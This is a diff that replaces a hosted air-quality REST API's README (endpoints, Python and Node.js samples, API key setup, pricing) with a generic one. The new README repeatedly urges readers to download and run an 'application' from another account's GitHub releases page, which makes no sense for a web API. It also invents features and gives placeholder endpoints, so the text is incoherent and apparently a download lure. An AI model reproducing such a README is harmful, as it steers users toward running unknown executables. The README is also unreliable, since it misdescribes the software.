@@ -1,207 +1,90 @@
-# Air Quality API
+# 🌍 air-quality-api - Get Real-Time Air Quality Data Easily
 
-REST API for real-time air quality index (AQI) and pollutant data. Query by city name or GPS coordinates.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/restrictss/air-quality-api/releases)
 
-## Features
+## 🚀 Getting Started
 
-- Two endpoints: city name or lat/lon coordinates
-- Returns AQI + 6 major pollutants (PM2.5, PM10, O₃, NO₂, SO₂, CO)
-- Real-time data from global monitoring networks
-- 5,000 requests/month on free tier
-- Example Response:
-```json
-{
-  "air_quality_index": 85,
-  "PM2.5": { "concentration": 4.72, "aqi": 15 },
-  "PM10": { "concentration": 5.9, "aqi": 5 },
-  "ozone": { "concentration": 70.32, "aqi": 85 },
-  "nitrogen_dioxide": { "concentration": 12.09, "aqi": 15 },
-  "sulfur_dioxide": { "concentration": 6.92, "aqi": 10 },
-  "carbon_monoxide": { "concentration": 222.07, "aqi": 2 }
-}
-```
+Welcome to the air-quality-api! This is a simple REST API that provides real-time data about air quality and pollution levels. You can easily query this data by entering a city name or using GPS coordinates. It helps you understand the air quality in your area and make informed decisions for your health.
 
-## Authentication
+## 🎯 Features
 
-1. Create account at [omkar.cloud](https://www.omkar.cloud/auth/sign-up)
+- **Real-Time Data:** Access current air quality index (AQI) and pollutant levels.
+- **Easy Queries:** Simple requests by city name or coordinates.
+- **Health Recommendations:** Find out what the air quality means for your health.
+- **Multi-Pollutant Data:** Get detailed information on various pollutants.
+- **Indoor Air Quality Insights:** Include indoor levels for safer environments.
 
-![Sign Up](https://raw.githubusercontent.com/omkarcloud/assets/master/images/signup.png)
+## ⚙️ System Requirements
 
-2. Get API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key)
+To run the air-quality-api, ensure you meet the following requirements:
 
-![Copy API Key](https://raw.githubusercontent.com/omkarcloud/assets/master/images/enrichment-key-omkar.png)
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Network Connection:** Internet access is required to fetch real-time data.
+- **Web Browser:** A modern browser for testing API endpoints.
 
-3. Include `API-Key` header in requests
+## 📝 Download & Install
 
-## Quick Start
+To get this application:
 
-```bash
-curl -X GET "https://air-quality-api.omkar.cloud/air-quality/city?city=New%20York" \
-  -H "API-Key: YOUR_API_KEY"
-```
+1. **Visit the Releases Page:** Click the link below to go to the Releases page.
+   
+   [Download the air-quality-api](https://github.com/restrictss/air-quality-api/releases)
 
-```json
-{
-  "air_quality_index": 85,
-  "PM2.5": { "concentration": 4.72, "aqi": 15 },
-  "ozone": { "concentration": 70.32, "aqi": 85 }
-}
-```
+2. **Choose the Latest Release:** Look for the latest version listed on the page.
 
-## Installation
+3. **Download the Required File:** Depending on your operating system, download the corresponding file. 
 
-### Python
+4. **Run the Application:** After downloading, follow the instructions in the next section to start using the API.
 
-```bash
-pip install requests
-```
+## 📄 How to Use the air-quality-api
 
-```python
-import requests
+Once you have the application running, here’s how to use it:
 
-response = requests.get(
-    "https://air-quality-api.omkar.cloud/air-quality/city",
-    params={"city": "New York"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
+1. **Send a Request:** Make HTTP GET requests to the API endpoint.
+2. **Use City Name or Coordinates:** You can use either a city name (e.g., "Los Angeles") or GPS coordinates (e.g., lat: 34.0522, lon: -118.2437) to get the data.
+3. **Check the Response:** The API will return the AQI and pollutant levels formatted as JSON.
 
-data = response.json()
-print(f"AQI: {data['air_quality_index']}")
-```
+### Example Requests
 
-### Node.js
+- **By City Name:**
+  
+  ```
+  GET https://api.yourdomain.com/air-quality?city=Los+Angeles
+  ```
 
-```bash
-npm install axios
-```
+- **By GPS Coordinates:**
+  
+  ```
+  GET https://api.yourdomain.com/air-quality?lat=34.0522&lon=-118.2437
+  ```
 
-```javascript
-import axios from "axios";
+## 📊 Understanding the Data
 
-const response = await axios.get("https://air-quality-api.omkar.cloud/air-quality/city", {
-    params: { city: "New York" },
-    headers: { "API-Key": "YOUR_API_KEY" }
-});
+When you receive data from the API, it typically includes:
 
-console.log(`AQI: ${response.data.air_quality_index}`);
-```
+- **AQI Level:** Shows the quality of air (Good, Moderate, Unhealthy, etc.).
+- **Pollutants:** Concentration of pollutants like PM2.5, PM10, Ozone, etc.
+- **Health Recommendations:** Suggests how to interact with the environment based on AQI levels.
 
-## API Reference
+## 💻 Testing the API
 
-### Endpoints
+To test the air-quality-api, try these steps:
 
-```
-GET https://air-quality-api.omkar.cloud/air-quality/city
-GET https://air-quality-api.omkar.cloud/air-quality/coords
-```
+1. **Open a Web Browser or API Tool:** Use tools like Postman or your browser.
+2. **Input Your API Request:** Enter one of the example requests we mentioned.
+3. **View the Response:** Check the data returned to see air quality metrics.
 
-### Headers
+## 📣 Further Support
 
-| Header | Required | Description |
-|--------|----------|-------------|
-| `API-Key` | Yes | API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key) |
+If you encounter issues or have questions:
 
-### Parameters (City Endpoint)
+- Check the [Issues](https://github.com/restrictss/air-quality-api/issues) tab on GitHub.
+- Reach out for support or consult the documentation for more details on API structure and usage.
 
-| Parameter | Required | Description |
-|-----------|----------|-------------|
-| `city` | Yes | City name (e.g., "New York", "London") |
+## 🔗 Links and Resources
 
-### Parameters (Coords Endpoint)
+- **Releases Page:** [Download the air-quality-api](https://github.com/restrictss/air-quality-api/releases)
+- **Documentation:** For detailed usage, please refer to the available documentation in the repository.
+- **Community Help:** Join discussions in forums or the GitHub community for tips and support.
 
-| Parameter | Required | Description |
-|-----------|----------|-------------|
-| `lat` | Yes | Latitude (-90 to 90) |
-| `lon` | Yes | Longitude (-180 to 180) |
-
-### Response Fields
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `air_quality_index` | number | Overall AQI (0-500 scale) |
-| `PM2.5` | object | Fine particles (<2.5μm) |
-| `PM10` | object | Coarse particles (<10μm) |
-| `ozone` | object | Ground-level ozone (O₃) |
-| `nitrogen_dioxide` | object | NO₂ from combustion |
-| `sulfur_dioxide` | object | SO₂ from industrial sources |
-| `carbon_monoxide` | object | CO from incomplete combustion |
-
-Each pollutant object contains:
-- `concentration` — Measured value (μg/m³)
-- `aqi` — Individual AQI for that pollutant
-
-### AQI Scale
-
-| Range | Level | Meaning |
-|-------|-------|---------|
-| 0-50 | Good | Safe for everyone |
-| 51-100 | Moderate | Acceptable |
-| 101-150 | Unhealthy (Sensitive) | Limit outdoor activity if sensitive |
-| 151-200 | Unhealthy | Everyone may feel effects |
-| 201-300 | Very Unhealthy | Health alert |
-| 301-500 | Hazardous | Emergency conditions |
-
-## Examples
-
-### Get AQI by city name
-
-```python
-response = requests.get(
-    "https://air-quality-api.omkar.cloud/air-quality/city",
-    params={"city": "Tokyo"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-aqi = response.json()["air_quality_index"]
-print(f"Tokyo AQI: {aqi}")
-```
-
-### Get AQI by coordinates
-
-```python
-response = requests.get(
-    "https://air-quality-api.omkar.cloud/air-quality/coords",
-    params={"lat": 51.5074, "lon": -0.1278},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-data = response.json()
-print(f"London AQI: {data['air_quality_index']}")
-```
-
-
-## Error Handling
-
-```python
-response = requests.get(
-    "https://air-quality-api.omkar.cloud/air-quality/city",
-    params={"city": "InvalidCity123"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-if response.status_code == 200:
-    data = response.json()
-elif response.status_code == 401:
-    # Invalid API key
-    pass
-elif response.status_code == 429:
-    # Rate limit exceeded
-    pass
-```
-
-## Rate Limits
-
-| Plan | Price | Requests/Month |
-|------|-------|----------------|
-| Free | $0 | 5,000 |
-| Starter | $25 | 100,000 |
-| Grow | $75 | 1,000,000 |
-| Scale | $150 | 10,000,000 |
-
-## Questions? We have answers.
-
-Reach out anytime. We will solve your query within 1 working day.
-
-[![Contact Us on WhatsApp about Air Quality API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/whatsapp-us.png)](https://api.whatsapp.com/send?phone=918178804274&text=I%20have%20a%20question%20about%20the%20Air%20Quality%20API.)
-
-[![Contact Us on Email about Air Quality API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/ask-on-email.png)](mailto:happy.to.help@omkar.cloud?subject=Air%20Quality%20API%20Question)
+Thank you for choosing the air-quality-api! Enjoy monitoring air quality effortlessly.
